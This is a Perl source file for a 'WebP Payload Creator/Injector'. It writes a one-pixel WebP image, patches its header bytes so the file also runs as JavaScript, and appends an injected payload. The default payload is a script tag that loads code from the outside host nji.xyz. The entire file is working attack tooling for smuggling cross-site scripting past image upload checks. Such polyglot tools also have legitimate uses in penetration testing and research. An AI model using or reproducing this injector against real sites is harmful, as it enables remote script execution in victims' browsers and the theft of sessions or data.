#!/usr/bin/env perl
#
# WebP Payload Creator/Injector
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to JK (https://jkliemann.de/) && Jon Sneyers
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
use feature 'say';

use POSIX;
use Getopt::Long;

sub usage;
sub create_webp;
sub inject_payload;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $outfile;

$payload //= '<script src=//nji.xyz></script>';

say <<EOF;
[>|      WebP Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload

EOF

create_webp             unless -f $outfile;
inject_payload;

say `file       $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub usage {
    say <<"EOF";
Usage: $0 [-payload 'STRING'] -output payload.webp

Currently, there is no possibility to inject the payload into an existing
webp image.  Only the new (minimal) webp image will be created and your
payload will be injected into.

If the -output argument file exists, the payload will be injected into 
the existing image, but this image will be corrupted.
EOF
    exit +shift;
}

sub create_webp {
    say "[>] Generating output file";

    # single pixel lossy webp image
    my $minimal_webp = "\x52\x49\x46\x46\x1a\x00\x00\x00"
                     . "\x57\x45\x42\x50\x56\x50\x38\x4c"
                     . "\x0d\x00\x00\x00\x2f\x00\x00\x00"
                     . "\x10\x07\x10\x11\x11\x88\x88\xfe"
                     . "\x07\x00";

    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
    syswrite   $fh, $minimal_webp;
    close      $fh;

    say "[✔] File saved to: $outfile\n";
}

sub inject_payload {
    say "[>] Injecting payload into $outfile";

    sysopen my $fh, $outfile, O_WRONLY;
    sysseek    $fh, 4, SEEK_SET;
    syswrite   $fh, "\x2f\x2a";

    sysseek    $fh, 15, SEEK_SET;
    syswrite   $fh, "\x4c\xff\xff\xff";

    sysseek    $fh, 0, SEEK_END;

    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";
    close      $fh;

    say "[✔] Payload was injected successfully\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
